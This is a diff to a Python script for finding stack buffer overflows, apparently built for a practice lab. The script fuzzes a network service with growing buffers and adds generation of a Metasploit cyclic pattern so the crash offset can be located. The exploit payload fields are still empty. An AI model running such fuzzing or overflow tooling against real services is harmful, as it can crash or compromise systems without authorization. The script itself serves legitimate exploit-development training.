@@ -2,6 +2,7 @@
 
 import argparse
 import socket
+import subprocess
 import sys
 import time
 
@@ -10,12 +11,15 @@ parser.add_argument('--fuzz',action='store_true')
 parser.add_argument('--overflow',action='store_true')
 parser.add_argument('--host')
 parser.add_argument('--port',type=int)
+parser.add_argument('--prefix')
+parser.add_argument('--length',type=int)
 args = parser.parse_args()
 
 ip = args.host
 port = args.port
 target = (ip,port)
 timeout = 3
+prefix = args.prefix
 
 def connect():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -25,7 +29,6 @@ def connect():
     return client
 
 def fuzz():
-    prefix = "OVERFLOW1 "
     string = prefix + "A" * 100
     while True:
         try:
@@ -40,16 +43,19 @@ def fuzz():
             print("[!] Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
             sys.exit(0)
         
-        string += 100 * "A"
+        string += "A" * 100
         time.sleep(1)
 
-def overflow():
-    prefix = "OVERFLOW1 "
+def overflow(length):
     offset = 0
     overflow = "A" * offset
     retn = ""
     padding = ""
-    payload = ""
+    if subprocess.run(['which','msf-pattern_create'], stdout=subprocess.DEVNULL).returncode == 0:
+        payload = subprocess.check_output(['msf-pattern_create','-l',length],universal_newlines=True).rstrip()
+    else:
+        print("[x] msf-pattern_create not found.")
+        exit()
     suffix = ""
     bof = prefix + overflow + retn + padding + payload + suffix
 
@@ -73,7 +79,12 @@ if __name__ == "__main__":
         print("[x] Please specify a host using --host.")
     elif not args.port:
         print("[x] Please specify a port using --port.")
+    elif not args.prefix:
+        print("[x] Please specify a prefix using --prefix.")
     elif args.fuzz:
         fuzz()
     elif args.overflow:
-        overflow()
+        if args.length:
+            overflow(str(args.length))
+        else:
+            print("[x] Please specify a pattern length using --length.")
